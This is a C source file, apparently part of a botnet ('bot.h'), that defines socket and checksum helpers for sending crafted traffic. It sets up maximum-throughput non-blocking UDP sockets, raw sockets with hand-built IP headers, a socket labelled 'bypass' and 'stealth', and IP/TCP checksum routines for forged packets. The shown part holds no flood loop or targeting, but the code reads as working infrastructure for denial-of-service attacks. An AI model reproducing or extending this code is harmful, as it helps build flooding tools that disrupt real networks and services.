#include "bot.h"

/* ── Socket creation helpers ───────────────────── */
int create_udp_socket(void)
{
    int s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (s < 0) return -1;
    int buf = SOCKET_BUF_SIZE, opt = 1;
    setsockopt(s, SOL_SOCKET, SO_SNDBUF, &buf, sizeof(buf));
    setsockopt(s, SOL_SOCKET, SO_SNDBUFFORCE, &buf, sizeof(buf));
    setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    setsockopt(s, SOL_SOCKET, SO_REUSEPORT, &opt, sizeof(opt));
    setsockopt(s, SOL_SOCKET, SO_NO_CHECK, &opt, sizeof(opt));
    int prio = 6;
    setsockopt(s, SOL_SOCKET, SO_PRIORITY, &prio, sizeof(prio));
    int tos = 0x10;
    setsockopt(s, IPPROTO_IP, IP_TOS, &tos, sizeof(tos));
    fcntl(s, F_SETFL, O_NONBLOCK);
    return s;
}

int create_raw_socket(int proto)
{
    int s = socket(AF_INET, SOCK_RAW, proto);
    if (s < 0) return -1;
    int one = 1;
    setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    int buf = SOCKET_BUF_SIZE;
    setsockopt(s, SOL_SOCKET, SO_SNDBUF, &buf, sizeof(buf));
    setsockopt(s, SOL_SOCKET, SO_SNDBUFFORCE, &buf, sizeof(buf));
    return s;
}

/* Bypass-tuned UDP socket (stealth: low priority, TTL, timeout) */
int create_bypass_socket(void)
{
    int s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (s < 0) return -1;
    int sndbuf = SOCKET_BUF_SIZE / 8;
    setsockopt(s, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    int reuse = 1;
    setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));
    setsockopt(s, SOL_SOCKET, SO_REUSEPORT, &reuse, sizeof(reuse));
    int priority = 2;
    setsockopt(s, SOL_SOCKET, SO_PRIORITY, &priority, sizeof(priority));
    int tos = 0x08;
    setsockopt(s, IPPROTO_IP, IP_TOS, &tos, sizeof(tos));
    struct timeval tv = {2, 0};
    setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
    int ttl = 64;
    setsockopt(s, IPPROTO_IP, IP_TTL, &ttl, sizeof(ttl));
    fcntl(s, F_SETFL, O_NONBLOCK);
    return s;
}

/* ── Checksums ─────────────────────────────────── */
uint16_t ip_csum(void *d, size_t l)
{
    uint16_t *p = (uint16_t *)d;
    uint32_t a = 0;
    for (size_t i = 0; i < l / 2; i++) a += p[i];
    if (l & 1) a += ((uint8_t *)d)[l - 1];
    while (a >> 16) a = (a & 0xFFFF) + (a >> 16);
    return ~a;
}

uint16_t tcp_csum(void *ip, void *tcp)
{
    struct iphdr *iph = (struct iphdr *)ip;
    struct tcphdr *tcph = (struct tcphdr *)tcp;
    struct {
        uint32_t sa, da;
        uint8_t z;
        uint8_t pr;
        uint16_t tl;
    } ps = {iph->saddr, iph->daddr, 0, IPPROTO_TCP, htons(sizeof(struct tcphdr))};
    uint32_t a = 0;
    uint16_t *p = (uint16_t *)&ps;
    for (size_t i = 0; i < sizeof(ps) / 2; i++) a += p[i];
    p = (uint16_t *)tcp;
    for (size_t i = 0; i < sizeof(struct tcphdr) / 2; i++) a += p[i];
    while (a >> 16) a = (a & 0xFFFF) + (a >> 16);
    return ~a;
}
